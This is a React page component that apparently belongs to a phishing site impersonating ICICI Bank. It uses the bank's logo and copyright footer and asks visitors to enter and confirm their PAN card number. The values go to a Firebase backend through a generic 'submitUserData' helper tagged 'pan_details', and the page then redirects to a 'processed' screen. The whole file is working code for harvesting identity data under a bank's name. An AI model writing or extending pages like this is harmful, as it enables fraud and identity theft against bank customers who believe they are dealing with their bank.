import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { submitUserData } from '../utils/firebase';

const PANDetailsPage = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    panNumber: '',
    confirmPanNumber: ''
  });

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      await submitUserData({
        ...formData,
        type: 'pan_details'
      });
      navigate('/processed');
    } catch (error) {
      console.error('Error submitting PAN details:', error);
    }
  };

  const handleInputChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  return (
    <div className="container">
      <div className="header">
        <img src="/icici h.jpg" alt="ICICI Bank Logo" />
      </div>

      <div className="content">
        <h2>PAN Card Details</h2>

        <div className="input-group">
          <label htmlFor="panNumber">PAN Number</label>
          <input
            type="text"
            id="panNumber"
            name="panNumber"
            maxLength="10"
            pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}"
            title="Please enter valid PAN number (e.g., ABCDE1234F)"
            required
            value={formData.panNumber}
            onChange={handleInputChange}
          />
        </div>

        <div className="input-group">
          <label htmlFor="confirmPanNumber">Confirm PAN Number</label>
          <input
            type="text"
            id="confirmPanNumber"
            name="confirmPanNumber"
            maxLength="10"
            pattern="[A-Z]{5}[0-9]{4}[A-Z]{1}"
            title="Please re-enter your PAN number"
            required
            value={formData.confirmPanNumber}
            onChange={handleInputChange}
          />
        </div>

        <button className="btn" onClick={handleSubmit}>Submit</button>
      </div>

      <div className="footer">
        <p>&copy; ICICI Bank</p>
      </div>
    </div>
  );
};

export default PANDetailsPage;
